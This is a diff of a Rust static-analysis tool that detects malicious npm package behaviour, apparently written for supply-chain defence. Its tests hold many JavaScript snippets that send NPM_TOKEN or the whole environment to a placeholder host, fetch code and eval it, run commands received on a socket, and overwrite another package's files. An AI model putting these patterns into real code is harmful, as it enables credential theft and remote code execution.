     let dropped = first_drop(text, &findings);
     for f in findings {
         match f {
@@ -2729,11 +3676,18 @@ fn facts_here(text: &[u32]) -> Option<Facts> {
                 }
             }
             Out::Decoded { at, from } => decoded.push((at as usize, from as usize)),
+            Out::Rewrote { at, pkg } => rewrote.push((at, pkg)),
             _ => {}
         }
     }
     decoded.sort_unstable();
     decoded.dedup_by_key(|d| d.0);
+    rewrote.sort();
+    rewrote.dedup();
+    let rewrote: Vec<(usize, PyStr)> = rewrote
+        .into_iter()
+        .map(|(at, pkg)| (text[..(at as usize).min(text.len())].iter().filter(|&&c| c == 0x0A).count() + 1, pkg))
+        .collect();
     let sent = match best {
         Some(((weak, _, at), kind, what)) => Answer::Found(at as usize, kind, what, weak),
         None => Answer::Nothing,
@@ -2742,7 +3696,7 @@ fn facts_here(text: &[u32]) -> Option<Facts> {
         let at = (at as usize).min(text.len());
         (text[..at].iter().filter(|&&c| c == 0x0A).count() + 1, cat)
     });
-    Some(Facts { sent, received, decoded, dropped })
+    Ok(Facts { sent, received, decoded, dropped, rewrote })
 }
 
 #[cfg(test)]
@@ -2753,7 +3707,7 @@ mod tests {
 
     fn sent(src: &str) -> Option<(&'static str, String, bool)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text).map(|f| f.sent) {
+        match facts_here(&text).ok().map(|f| f.sent) {
             Some(Answer::Found(_at, kind, what, in_address)) => {
                 Some((kind, what.iter().map(|&c| char::from_u32(c).unwrap_or('?')).collect(), in_address))
             }
@@ -2769,10 +3723,52 @@ mod tests {
     /// The category of a text's first received code, if any.
     fn runs(src: &str) -> Option<&'static str> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text) {
+        match facts_here(&text).ok() {
             Some(f) => f.received.map(|(_, cat)| cat),
             None => panic!("not read: {}", src),
         }
+    }
+
+    #[test]
+    fn html_like_comments_are_read_as_the_runtimes_read_them() {
+        // (F-12) a file that opens with `<!--` is read, as V8 reads a script (it did not parse before)
+        let post = format!("fetch('https://{}/c', {{ method: 'POST', body: v }});\n", HOST);
+        assert_eq!(sent(&format!("<!-- a banner\nconst v = process.env.NPM_TOKEN;\n{}", post)), found("environment", "NPM_TOKEN"));
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n--> a close\n{}", post)), found("environment", "NPM_TOKEN"));
+        // after code, `<!--` is `<` `!` `--` to tsc (this text may be a TypeScript file's): what follows it is read
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN; let y = 1;\nz = 5 <!--y, {}", post)), found("environment", "NPM_TOKEN"));
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN; let y = 1;\nz = 5\n<!--y, {}", post)), found("environment", "NPM_TOKEN"));
+        // and where that reading is no program, no runtime runs it so: the comment's reading stands
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n<!-- a note\n{}", post)), found("environment", "NPM_TOKEN"));
+    }
+
+    #[test]
+    fn what_v8_compiles_and_the_parser_refused_is_read() {
+        // (JS-PARSE-STRICT) an assignment to a call, which V8 compiles and leaves to a ReferenceError when it runs, and
+        // `let` as a name in a for-in head, made the whole file a syntax error to the parser: the tree said nothing
+        let post = format!("fetch('https://{}/c', {{ method: 'POST', body: v }});\n", HOST);
+        for odd in ["if (0) { f() = 1; }", "if (0) { f()++; }", "if (0) { for (f() in x); }", "for (let in {});"] {
+            assert_eq!(sent(&format!("{}\nconst v = process.env.NPM_TOKEN;\n{}", odd, post)), found("environment", "NPM_TOKEN"), "{}", odd);
+        }
+        // the call made before the ReferenceError is read: here the send itself
+        let call = format!("fetch('https://{}/c', {{ method: 'POST', body: v }}) = 0;\n", HOST);
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n{}", call)), found("environment", "NPM_TOKEN"));
+        let call = format!("for (fetch('https://{}/c', {{ method: 'POST', body: v }}) in {{ a: 1 }});\n", HOST);
+        assert_eq!(sent(&format!("const v = process.env.NPM_TOKEN;\n{}", call)), found("environment", "NPM_TOKEN"));
+    }
+
+    #[test]
+    fn the_parse_alone_says_what_the_model_says_of_a_refusal() {
+        // (JS-PARSE-STRICT) the registry's js_refusal asks the parse alone, of a text another test read on its tree
+        let deep = format!("x = {}{};\n", "[".repeat(200), "]".repeat(200));
+        let srcs = ["const = 1;\n", "x = 'unterminated\n", "module.exports = 1;\n", "if (0) { f() = 1; }\n",
+                    "let x: number = 1;\n", "<!-- a banner\nx = 1;\n", deep.as_str()];
+        for src in srcs {
+            let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
+            assert_eq!(parse_refusal(&text), refusal(&text), "{}", src);
+        }
+        let text: Vec<u32> = "a = 1;\nconst = 1;\n".chars().map(|c| c as u32).collect();
+        assert_eq!(parse_refusal(&text), Some((2, u("unexpected token '='"))));
     }
 
     #[test]
@@ -2792,6 +3788,76 @@ mod tests {
         );
         // a local object named process is not the environment
         assert_eq!(sent(&format!("const process = {{ env: {{ TOKEN: 'x' }} }};\nconst v = process.env.TOKEN;\n{}", post)), None);
+    }
+
+    #[test]
+    fn copies_and_holders_of_the_environment_read_by_name() {
+        // D-16: process.env held by a parameter's default, an object's property or a copy keeps no mark; a member
+        // read by a variable's name is that variable, one of another name is not the environment
+        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
+        // prisma's shape: a parameter whose default is process.env
+        let src = format!("function base(env = process.env) {{ return env.API_URL || 'https://api.invalid'; }}\n{}", post("base()"));
+        assert_eq!(sent(&src), None);
+        for (setup, read) in [
+            ("const env = { ...process.env };", "env.API_URL"),
+            ("const env = Object.assign({}, process.env);", "env.API_URL"),
+            // clipanion's context
+            ("const ctx = { env: process.env };", "ctx.env.API_URL"),
+            // corepack's: `{ env: <a copy>, path }`, its path read
+            ("const local = { env: { ...process.env }, path: '/p/.corepack.env' };", "local.path"),
+        ] {
+            assert_eq!(sent(&format!("{}\n{}", setup, post(read))), None, "{}", setup);
+        }
+        // a secret variable read so is that variable
+        assert_eq!(sent(&format!("const env = {{ ...process.env }};\n{}", post("env.NPM_TOKEN"))), found("environment", "NPM_TOKEN"));
+        // a parameter read by members: what a call gives it is not the whole environment there (prisma's telemetry:
+        // `buildTelemetryEvent(payload, config, env)` reads `env.platform`, `env.env.npm_config_user_agent` and calls
+        // `env.readProjectPackageJson()`), in what it returns and at a send it reaches, and through a function that
+        // hands the parameter on
+        for (setup, read) in [
+            ("function u(env) { return 'https://' + env.API_HOST; }", "u(process.env)"),
+            (
+                "function ev(p, e) { return { os: e.platform, pm: e.env.npm_config_user_agent, ts: e.readPkg() }; }",
+                "JSON.stringify(ev({}, { platform: process.platform, env: process.env, readPkg: () => null }))",
+            ),
+            ("function base(env) { return env.API_URL || 'https://api.invalid'; }\nfunction get(e) { return base(e) + '/x'; }", "get(process.env)"),
+        ] {
+            assert_eq!(sent(&format!("{}\n{}", setup, post(read))), None, "{}", setup);
+        }
+        let src = format!("function rep(c) {{ {} }}\nrep({{ platform: 'x', env: process.env }});\n", post("c.platform"));
+        assert_eq!(sent(&src), None);
+        // the copy or the holder sent whole, or the holder's environment, is still the whole environment, through a
+        // parameter too: returned whole, beside a member, as its `env`, or sent whole where it is the parameter
+        for (setup, read) in [
+            ("const env = { ...process.env };", "JSON.stringify(env)"),
+            ("const ctx = { env: process.env, n: 1 };", "JSON.stringify(ctx)"),
+            ("const ctx = { env: process.env };", "JSON.stringify(ctx.env)"),
+            ("function f(env = process.env) { return env; }", "JSON.stringify(f())"),
+            ("function g(c) { return c.env; }", "JSON.stringify(g({ env: process.env }))"),
+            ("function m(e) { return { p: e.platform, all: e }; }", "JSON.stringify(m(process.env))"),
+            ("function fmt(l) { return l.join('\\n'); }", "fmt(Object.entries(process.env).map(([k, v]) => k + '=' + v))"),
+        ] {
+            assert_eq!(sent(&format!("{}\n{}", setup, post(read))), found("environment", "the whole environment"), "{}", setup);
+        }
+        let src = format!("function send(e) {{ {} }}\nsend(process.env);\n", post("JSON.stringify(e)"));
+        assert_eq!(sent(&src), found("environment", "the whole environment"));
+    }
+
+    #[test]
+    fn a_json_file_given_require_is_parsed() {
+        // D-18: corepack requires the package.json of the package manager it downloaded; require parses JSON and
+        // runs none of it
+        let dl = |end: &str| {
+            format!(
+                "const https = require('https');\nhttps.get('https://{}/m', (res) => {{ let d = ''; \
+                 res.on('data', (c) => d += c); res.on('end', () => {{ {} }}); }});\n",
+                HOST, end
+            )
+        };
+        assert_eq!(runs(&dl("require(d);")), Some("import"));
+        assert_eq!(runs(&dl("require('./m/' + d + '.js');")), Some("import"));
+        assert_eq!(runs(&dl("require('./m/' + d + '.json');")), None);
+        assert_eq!(runs(&dl("require(require('path').join('/tmp', d, 'package.json'));")), None);
     }
 
     #[test]
@@ -2822,6 +3888,154 @@ mod tests {
         // a function of the os module given as a value
         let src = format!("const os = require('os');\nfunction tryGet(f) {{ return f(); }}\n{}", post("tryGet(os.hostname)"));
         assert_eq!(sent(&src), found("identity", "hostname"));
+    }
+
+    #[test]
+    fn containers_hold_what_they_are_given() {
+        // D-3: the tree knew an array's push and unshift alone; what a Map, a Set or a FormData was given, or
+        // Object.assign put into an object, was sent unseen
+        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
+        let env = found("environment", "the whole environment");
+        for (fill, body) in [
+            ("const c = [];\nc.push(process.env);\n", "JSON.stringify(c)"),
+            ("const c = [];\nc.unshift(process.env);\n", "JSON.stringify(c)"),
+            ("const c = [];\nc.splice(0, 0, process.env);\n", "JSON.stringify(c)"),
+            ("const c = new Array(1);\nc.fill(process.env);\n", "JSON.stringify(c)"),
+            ("const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify([...c])"),
+            ("const c = new Map();\nc.set('e', process.env);\n", "JSON.stringify(c.get('e'))"),
+            ("const c = new Set();\nc.add(JSON.stringify(process.env));\n", "JSON.stringify([...c])"),
+            ("const c = new FormData();\nc.append('e', JSON.stringify(process.env));\n", "c"),
+            ("const c = new URLSearchParams();\nc.set('e', JSON.stringify(process.env));\n", "c.toString()"),
+            ("const c = {};\nObject.assign(c, { e: process.env });\n", "JSON.stringify(c)"),
+            ("const c = {};\nObject.defineProperty(c, 'e', { value: process.env, enumerable: true });\n", "JSON.stringify(c)"),
+            ("const c = {};\nReflect.set(c, 'e', process.env);\n", "JSON.stringify(c)"),
+        ] {
+            assert_eq!(sent(&format!("{}{}", fill, post(body))), env, "{}", fill);
+        }
+        // a module's container, filled in a function and sent in another
+        let src = format!(
+            "const c = new Map();\nfunction keep() {{ c.set('e', process.env); }}\nkeep();\n{}",
+            post("JSON.stringify([...c])")
+        );
+        assert_eq!(sent(&src), env);
+        // one variable in a header
+        let src = format!(
+            "const h = new Headers();\nh.set('authorization', process.env.NPM_TOKEN);\n\
+             fetch('https://{}/c', {{ method: 'POST', headers: h }});\n",
+            HOST
+        );
+        assert_eq!(sent(&src), found("environment", "NPM_TOKEN"));
+        // what a container holds that nothing sends, and what an import is given, are not sent
+        assert_eq!(sent(&format!("const c = new Map();\nc.set('e', process.env);\n{}", post("'ok'"))), None);
+        assert_eq!(sent(&format!("import c from 'store';\nc.set('e', process.env);\n{}", post("JSON.stringify(c)"))), None);
+        // code received into a Map, then run
+        let src = "const https = require('https');\nhttps.get('https://x.invalid/c', (r) => {\n  const m = new Map();\n  \
+                   let b = '';\n  r.on('data', (d) => { b += d; });\n  r.on('end', () => { m.set('c', b); eval(m.get('c')); });\n});\n";
+        assert_eq!(runs(src), Some("run"));
+    }
+
+    #[test]
+    fn a_members_container_holds_what_it_is_given() {
+        // D-3b: a member's container (`o.list.push(x)`, `this.items.push(x)`, `Object.assign(this.opts, …)`) holds
+        // what it is given, apart from the object that holds it
+        let post = |v: &str| format!("fetch('https://{}/c', {{ method: 'POST', body: {} }});\n", HOST, v);
+        let env = found("environment", "the whole environment");
+        for (fill, body) in [
+            ("const o = { list: [] };\no.list.push(process.env);\n", "JSON.stringify(o.list)"),
+            ("const o = { list: [] };\no.list.unshift(process.env);\n", "JSON.stringify(o.list.slice(0))"),
+            ("const o = { m: new Map() };\no.m.set('e', process.env);\n", "JSON.stringify([...o.m])"),
+            ("const o = { opts: {} };\nObject.assign(o.opts, { e: process.env });\n", "JSON.stringify(o.opts)"),
+        ] {
+            assert_eq!(sent(&format!("{}{}", fill, post(body))), env, "{}", fill);
+        }
+        // a member of this
+        let src = format!(
+            "class C {{\n  constructor() {{ this.items = []; }}\n  keep() {{ this.items.push(process.env); }}\n  \
+             send() {{ {} }}\n}}\nconst c = new C();\nc.keep();\nc.send();\n",
+            post("JSON.stringify(this.items)")
+        );
+        assert_eq!(sent(&src), env);
+        let src = format!(
+            "class C {{\n  constructor() {{ this.opts = {{}}; }}\n  keep() {{ Object.assign(this.opts, process.env); }}\n  \
+             send() {{ {} }}\n}}\nconst c = new C();\nc.keep();\nc.send();\n",
+            post("JSON.stringify(this.opts)")
+        );
+        assert_eq!(sent(&src), env);
+        // a module's object, filled in one function and sent in another declared before it
+        let src = format!(
+            "const store = {{ list: [] }};\nfunction send() {{ {} }}\nfunction keep() {{ store.list.push(process.env); }}\n\
+             keep();\nsend();\n",
+            post("JSON.stringify(store.list)")
+        );
+        assert_eq!(sent(&src), env);
+        // the object's other members do not hold it
+        let src = format!("const o = {{ list: [], name: 'x' }};\no.list.push(process.env);\n{}", post("o.name"));
+        assert_eq!(sent(&src), None);
+        let src = format!(
+            "class C {{\n  constructor() {{ this.items = []; this.name = 'x'; }}\n  keep() {{ this.items.push(process.env); }}\n  \
+             send() {{ {} }}\n}}\nconst c = new C();\nc.keep();\nc.send();\n",
+            post("this.name")
+        );
+        assert_eq!(sent(&src), None);
+        // code received into a member's container, then run
+        let src = "const https = require('https');\nconst q = { parts: [] };\nhttps.get('https://x.invalid/c', (r) => {\n  \
+                   r.on('data', (d) => { q.parts.push(d); });\n  r.on('end', () => { eval(q.parts.join('')); });\n});\n";
+        assert_eq!(runs(src), Some("run"));
+        // what a method is given, put into a member of this, is not what each caller gives (a recorder's events: a
+        // hub of everything every caller records, monaco-editor's loader)
+        let src = format!(
+            "class R {{\n  constructor() {{ this.events = []; }}\n  record(d) {{ this.events.push(d); }}\n  \
+             all() {{ return this.events; }}\n}}\nconst r = new R();\nr.record(process.env);\n{}",
+            post("JSON.stringify(r.all())")
+        );
+        assert_eq!(sent(&src), None);
+    }
+
+    #[test]
+    fn a_method_reads_this_as_its_receiver() {
+        // B-3: in a class made in several places (B-1 keeps its instances apart), what one method of an instance was
+        // given reaches what another method of that instance does with it, and no other instance's
+        let class = "class R {\n  setCode(t) { this.c = t; }\n  run() { eval(this.c); }\n}\n";
+        let made = "const a = new R();\nconst b = new R();\n";
+        let get = "const https = require('https');\nhttps.get('https://x.invalid/c', (res) => {\n  let d = '';\n  \
+                   res.on('data', (c) => { d += c; });\n  res.on('end', () => { a.setCode(d); a.run(); });\n});\n";
+        assert_eq!(runs(&format!("{}{}{}", class, made, get)), Some("run"));
+        assert_eq!(runs(&format!("{}{}{}", class, made, get.replace("a.run()", "b.run()"))), None);
+        // through another method of its own
+        let via = class.replace("  run() {", "  go() { this.run(); }\n  run() {");
+        assert_eq!(runs(&format!("{}{}{}", via, made, get.replace("a.run()", "a.go()"))), Some("run"));
+        // and what it sends
+        let class = "class S {\n  keep(v) { this.v = v; }\n  send() { fetch('https://x.invalid/c', { method: 'POST', body: this.v }); }\n}\n";
+        let src = format!("{}const a = new S();\nconst b = new S();\na.keep(require('os').hostname());\na.send();\n", class);
+        assert_eq!(sent(&src), found("identity", "hostname"));
+        assert_eq!(sent(&src.replace("a.send()", "b.send()")), None);
+    }
+
+    #[test]
+    fn received_data_put_in_a_variable_outside_its_callback() {
+        // D-15: the response https.get's callback is given, kept in its variable, then put into a variable declared
+        // outside that callback and run (the text detector found these; the tree did not)
+        let get = |end: &str| {
+            format!(
+                "https.get('https://x.invalid/c', (r) => {{\n  let d = '';\n  r.on('data', (c) => {{ d += c; }});\n  \
+                 r.on('end', () => {{ {} }});\n}});\n",
+                end
+            )
+        };
+        let req = "const https = require('https');\n";
+        assert_eq!(runs(&format!("{}let p;\n{}", req, get("p = d; eval(p);"))), Some("run"));
+        assert_eq!(runs(&format!("{}let p;\n{}setTimeout(() => eval(p), 1000);\n", req, get("p = d;"))), Some("run"));
+        let main = format!("{}function main() {{\n  let p;\n  {}}}\nmain();\n", req, get("p = d; eval(p);"));
+        assert_eq!(runs(&main), Some("run"));
+        // what a library requests for its caller is not the script's download
+        let load = get("p = d; eval(p);").replace("'https://x.invalid/c'", "u");
+        let src = format!("{}let p;\nfunction load(u) {{\n  {}}}\nmodule.exports = load;\n", req, load);
+        assert_eq!(runs(&src), None);
+        // and what is sent, as before
+        let src = "const os = require('os');\nlet p;\nsetTimeout(() => {\n  let d = '';\n  \
+                   setImmediate(() => { d = os.hostname(); });\n  \
+                   setTimeout(() => { p = d; fetch('https://x.invalid/c', { method: 'POST', body: p }); }, 1);\n}, 1);\n";
+        assert_eq!(sent(src), found("identity", "hostname"));
     }
 
     #[test]
@@ -3062,7 +4276,7 @@ mod tests {
     fn decoded(src: &str) -> Vec<(usize, usize)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
         let line = |at: usize| text[..at.min(text.len())].iter().filter(|&&c| c == 0x0A).count() + 1;
-        match facts_here(&text) {
+        match facts_here(&text).ok() {
             Some(f) => f.decoded.iter().map(|&(at, from)| (line(at), line(from))).collect(),
             None => panic!("not read: {}", src),
         }
@@ -3102,7 +4316,7 @@ mod tests {
 
     fn dropped(src: &str) -> Option<(usize, u16, String, Option<String>)> {
         let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
-        match facts_here(&text) {
+        match facts_here(&text).ok() {
             Some(f) => f.dropped.map(|d| (d.line, d.kinds, pystr::to_string(&d.what), d.interp.map(|i| pystr::to_string(&i)))),
             None => panic!("not read: {}", src),
         }
@@ -3121,7 +4335,6 @@ mod tests {
         let src = "const fs = require('fs');\nconst { fork } = require('child_process');\nconst p = `${__dirname}/w.js`;\nfs.writeFileSync(p, require('zlib').inflateSync(blob));\nfork(p);\n";
         assert_eq!(dropped(src).map(|d| (d.0, d.3)), Some((5, Some("node".into()))));
         // a download written, run by an interpreter; a binary downloaded and run (installers): nothing
-        // (what a callback is given is followed by the function's summary, which keeps no file: not yet)
         let src = "const fs = require('fs');\nconst { spawn } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/i.js');\n  fs.writeFileSync('i.js', await res.text());\n  spawn(process.execPath, ['i.js']);\n}\ngo();\n";
         assert_eq!(dropped(src).map(|d| (d.0, d.1, d.3)), Some((6, K_RECEIVED, Some("node".into()))));
         let src = "const fs = require('fs');\nconst { execFileSync } = require('child_process');\nasync function go() {\n  const res = await fetch('https://example.invalid/bin');\n  fs.writeFileSync('bin/tool', Buffer.from(await res.arrayBuffer()));\n  execFileSync('bin/tool', ['--version']);\n}\ngo();\n";
@@ -3141,5 +4354,298 @@ mod tests {
         // a text read sliced is not a binary's
         let src = "const fs = require('fs');\nconst { spawn } = require('child_process');\nconst s = fs.readFileSync('a.txt', 'utf8').slice(10);\nfs.writeFileSync('/tmp/a', s);\nspawn('/tmp/a');\n";
         assert_eq!(dropped(src), None);
+    }
+
+    #[test]
+    fn a_climb_to_a_scoped_package_beside_its_own() {
+        // D-9b: out of the script's own folder to a scoped package's
+        let rewrote = |src: &str| -> Vec<(usize, String)> {
+            let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
+            facts_here(&text).expect("read").rewrote.iter().map(|(l, p)| (*l, pystr::to_string(p))).collect()
+        };
+        for dir in ["__dirname", "path.dirname(__filename)"] {
+            let src = format!(
+                "const fs = require('fs'), path = require('path');\n\
+                 fs.writeFileSync(path.join({}, '..', '..', '@whiskeysockets', 'baileys', 'lib', 'index.js'), 'x');\n",
+                dir
+            );
+            assert_eq!(rewrote(&src), vec![(2, "@whiskeysockets/baileys".to_string())], "{}", dir);
+        }
+        let src = "import fs from 'fs';\nimport path from 'path';\n\
+                   fs.writeFileSync(path.join(import.meta.dirname, '../../@a/b/x.mjs'), 'x');\n";
+        assert_eq!(rewrote(src), vec![(3, "@a/b".to_string())]);
+        // not: an unscoped name after the climb (as likely one of the package's own folders), no climb, a name of the
+        // script's own
+        for src in [
+            "const fs = require('fs'), path = require('path');\nfs.writeFileSync(path.join(__dirname, '..', 'lib', 'x.js'), 'x');\n",
+            "const fs = require('fs'), path = require('path');\nfs.writeFileSync(path.join(__dirname, '@a', 'b', 'x.js'), 'x');\n",
+            "const fs = require('fs'), path = require('path');\n\
+             function f(__dirname) { fs.writeFileSync(path.join(__dirname, '..', '@a', 'b', 'x.js'), 'x'); }\nf('/tmp');\n",
+        ] {
+            assert_eq!(rewrote(src), Vec::<(usize, String)>::new(), "{}", src);
+        }
+    }
+
+    #[test]
+    fn code_written_in_another_packages_folder() {
+        // D-9: @dinzid04/libsignal-node 2.2.5's shape, its payload inert: the target found by require.resolve or a
+        // path joined from node_modules, its code file written with the script's own text
+        let rewrote = |src: &str| -> Vec<(usize, String)> {
+            let text: Vec<u32> = src.chars().map(|c| c as u32).collect();
+            facts_here(&text).expect("read").rewrote.iter().map(|(l, p)| (*l, pystr::to_string(p))).collect()
+        };
+        let src = "const fs = require('fs');\nconst path = require('path');\nfunction findTarget() {\n  \
+                   const possible = [path.join(process.cwd(), 'node_modules', '@whiskeysockets', 'baileys')];\n  \
+                   try { possible.unshift(require.resolve('@whiskeysockets/baileys/package.json').replace('/package.json', '')); } catch (e) {}\n  \
+                   for (const p of possible) { if (fs.existsSync(path.join(p, 'lib', 'Socket', 'newsletter.js'))) return p; }\n  \
+                   return null;\n}\nconst MODIFIED = `'use strict';\\nexports.x = 1;\\n`;\nfunction install() {\n  \
+                   const base = findTarget();\n  if (!base) return;\n  const file = path.join(base, 'lib', 'Socket', 'newsletter.js');\n  \
+                   fs.writeFileSync(file, MODIFIED);\n}\ninstall();\n";
+        assert_eq!(rewrote(src), vec![(14, "@whiskeysockets/baileys".to_string())]);
+        // require.resolve alone, at the module's top: the file it names, or the folder of what it names
+        let src = "const fs = require('fs'), path = require('path');\n\
+                   const base = require.resolve('@whiskeysockets/baileys/package.json').replace('/package.json', '');\n\
+                   fs.writeFileSync(path.join(base, 'lib', 'Socket', 'newsletter.js'), 'exports.x = 1;');\n\
+                   fs.writeFileSync(path.join(path.dirname(require.resolve('left-pad')), 'index.js'), 'x');\n";
+        assert_eq!(rewrote(src), vec![(3, "@whiskeysockets/baileys".to_string()), (4, "left-pad".to_string())]);
+        // an ES module's: createRequire's require, import.meta.resolve
+        let src = "import fs from 'fs';\nimport path from 'path';\nimport { createRequire } from 'module';\n\
+                   import { fileURLToPath } from 'url';\nconst require = createRequire(import.meta.url);\n\
+                   fs.writeFileSync(path.join(path.dirname(require.resolve('left-pad')), 'index.js'), 'x');\n\
+                   fs.writeFileSync(path.join(path.dirname(fileURLToPath(import.meta.resolve('@a/b'))), 'c.mjs'), 'x');\n";
+        assert_eq!(rewrote(src), vec![(6, "left-pad".to_string()), (7, "@a/b".to_string())]);
+        // (a `require` of the script's own resolves nothing of the platform's)
+        let src = "const fs = require('fs');\nfunction f(require) {\n  \
+                   fs.writeFileSync(require.resolve('left-pad/index.js'), 'x');\n}\nf({ resolve: (s) => s });\n";
+        assert_eq!(rewrote(src), Vec::<(usize, String)>::new());
+        // a file copied over one, a path of node_modules in one part
+        let src = "const fs = require('fs'), path = require('path');\n\
+                   fs.copyFileSync(path.join(__dirname, 'patch.js'), path.join(process.cwd(), 'node_modules/left-pad', 'index.js'));\n";
+        assert_eq!(rewrote(src), vec![(2, "left-pad".to_string())]);
+        // a data file, a dot folder (a cache), a read, the script's own folder: none
+        for src in [
+            "const fs = require('fs'), path = require('path');\nfs.writeFileSync(path.join('node_modules', 'x', 'data.json'), '{}');\n",
+            "const fs = require('fs'), path = require('path');\nfs.writeFileSync(path.join('node_modules', '.cache', 'x', 'a.js'), s);\n",
+            "const fs = require('fs');\nconst s = fs.readFileSync(require.resolve('x/index.js'), 'utf8');\n",
+            "const fs = require('fs'), path = require('path');\nfs.writeFileSync(path.join(__dirname, 'out.js'), s);\n",
+        ] {
+            assert_eq!(rewrote(src), Vec::<(usize, String)>::new(), "{}", src);
+        }
+    }
+
+    #[test]
+    fn a_download_a_callback_is_given_written_then_run() {
+        // D-2: the response a callback is given, written to a file and run; the function's summary keeps the file it
+        // writes a parameter to, so the write is known when the client gives the callback the download
+        let head = "const fs = require('fs');\nconst { exec } = require('child_process');\nconst p = '/tmp/x.py';\n";
+        let cases = [
+            // the request client's callback, given the body
+            "const request = require('request');\nrequest.get('https://h.invalid/x.py', (e, r, b) => { fs.writeFileSync(p, b); exec('python3 ' + p); });\n",
+            // https.get's response, its chunks gathered, written when it ends
+            "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { let d = ''; res.on('data', (c) => { d += c; }); res.on('end', () => { fs.writeFileSync(p, d); exec('python3 ' + p); }); });\n",
+            // piped into a file, run when the file is finished
+            "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { const f = fs.createWriteStream(p); res.pipe(f); f.on('finish', () => exec('python3 ' + p)); });\n",
+            // a helper that writes what it is given, the run elsewhere
+            "const https = require('https');\nfunction save(data) { fs.writeFileSync(p, data); }\nhttps.get('https://h.invalid/x.py', (res) => { let d = ''; res.on('data', (c) => { d += c; }); res.on('end', () => { save(d); exec('python3 ' + p); }); });\n",
+        ];
+        for case in cases {
+            let src = format!("{}{}", head, case);
+            assert_eq!(dropped(&src).map(|d| (d.1, d.3)), Some((K_RECEIVED, Some("Python".into()))), "{}", case);
+        }
+        // a program downloaded and run (what an installer of a binary does); a download written, nothing run
+        let src = format!("{}{}", head, "const https = require('https');\nhttps.get('https://h.invalid/tool', (res) => { const f = fs.createWriteStream('/tmp/tool'); res.pipe(f); f.on('finish', () => require('child_process').spawn('/tmp/tool')); });\n");
+        assert_eq!(dropped(&src), None);
+        let src = format!("{}{}", head, "const https = require('https');\nhttps.get('https://h.invalid/x.py', (res) => { res.pipe(fs.createWriteStream(p)); });\n");
+        assert_eq!(dropped(&src), None);
+        // a callback given what the script reads from its own package, written and run: not a download
+        let src = format!("{}{}", head, "fs.readFile(__dirname + '/x.py', 'utf8', (err, d) => { fs.writeFileSync(p, d); exec('python3 ' + p); });\n");
+        assert_eq!(dropped(&src), None);
+    }
+
+    #[test]
+    fn what_popular_packages_do() {
+        // a library's loader fetches the address it is given, or works out
+        // from what it is given (Monaco's, vitest's): not the script's own
+        // download; the script's own address is
+        let given = "function load(u) {\n  fetch(u).then((r) => r.text()).then((t) => { new Function(t).call(self); });\n}\nmodule.exports = load;\n";
+        assert_eq!(runs(given), None);
+        let method = "class Loader {\n  load(e, i, s, n) {\n    fetch(i).then((o) => o.text()).then((o) => { new Function(o).call(self); s(); });\n  }\n}\nmodule.exports = Loader;\n";
+        assert_eq!(runs(method), None);
+        let config = "class Loader {\n  load(e, i, s, n) {\n    const { trustedTypesPolicy: l } = e.getConfig().getOptionsLiteral();\n    fetch(i).then((o) => o.text()).then((o) => { (l ? self.eval(l.createScript('', o)) : new Function(o)).call(self); s(); });\n  }\n}\nmodule.exports = Loader;\n";
+        assert_eq!(runs(config), None);
+        assert_eq!(runs(&format!("fetch('https://{}/p').then((r) => r.text()).then((t) => {{ new Function(t)(); }});\n", HOST)), Some("run"));
+        assert_eq!(runs(&format!("const base = 'https://{}';\nfetch(base + '/p').then((r) => r.text()).then(eval);\n", HOST)), Some("run"));
+        // an item of a list the script writes (a fallback's addresses) is its own
+        let fallback = format!(
+            "const axios = require('axios');\nconst domain = 'api.' + 'invalid';\nconst check = async () => {{\n  const urls = [`https://${{domain}}/a`, `https://{}/b`];\n\
+             for (const url of urls) {{\n    const response = await axios.get(url);\n    new Function('require', response.data.model)(require);\n  }}\n}};\nmodule.exports = check;\n",
+            HOST
+        );
+        assert_eq!(runs(&fallback), Some("run"));
+        // a global the script reads as a value (what the page or another
+        // file defines) is its own address, given to a request or to the
+        // script's own downloader; the platform's objects are not, nor is
+        // an object (a namespace TypeScript's emit passes its module function:
+        // Monaco's AMDLoader)
+        assert_eq!(runs("const axios = require('axios');\n(async function () {\n  const s = (await axios.get(src)).data;\n  eval(s);\n})();\n"), Some("run"));
+        let get = "const get = (u) => fetch(u).then((r) => r.text());\n";
+        assert_eq!(runs(&format!("{}get(src).then((t) => eval(t));\n", get)), Some("run"));
+        assert_eq!(runs(&format!("{}get('https://{}/' + process.platform).then((t) => eval(t));\n", get, HOST)), Some("run"));
+        assert_eq!(runs(&format!("{}get(typeof window !== 'undefined' ? window : global).then((t) => eval(t));\n", get)), None);
+        assert_eq!(runs(&format!("{}get(location).then((t) => eval(t));\n", get)), None);
+        assert_eq!(runs(&format!("var NS;\n{}get(NS || (NS = {{}})).then((t) => eval(t));\n", get)), None);
+        // what a server is sent is received: its handler's request, its
+        // data events; the server itself, its address and options, and its
+        // other events are not (vite's dev server)
+        let body = "const http = require('http');\nhttp.createServer((req, res) => { let b = ''; req.on('data', (d) => b += d); req.on('end', () => eval(b)); }).listen(8080);\n";
+        assert_eq!(runs(body), Some("run"));
+        let event = "const http = require('http');\nconst server = http.createServer();\nserver.on('request', (req, res) => { req.on('data', (d) => eval(d.toString())); });\nserver.listen(8080);\n";
+        assert_eq!(runs(event), Some("run"));
+        let socket = "const net = require('net');\nnet.createServer((sock) => { sock.on('data', (d) => require('child_process').exec(d.toString())); }).listen(4444);\n";
+        assert_eq!(runs(socket), Some("run"));
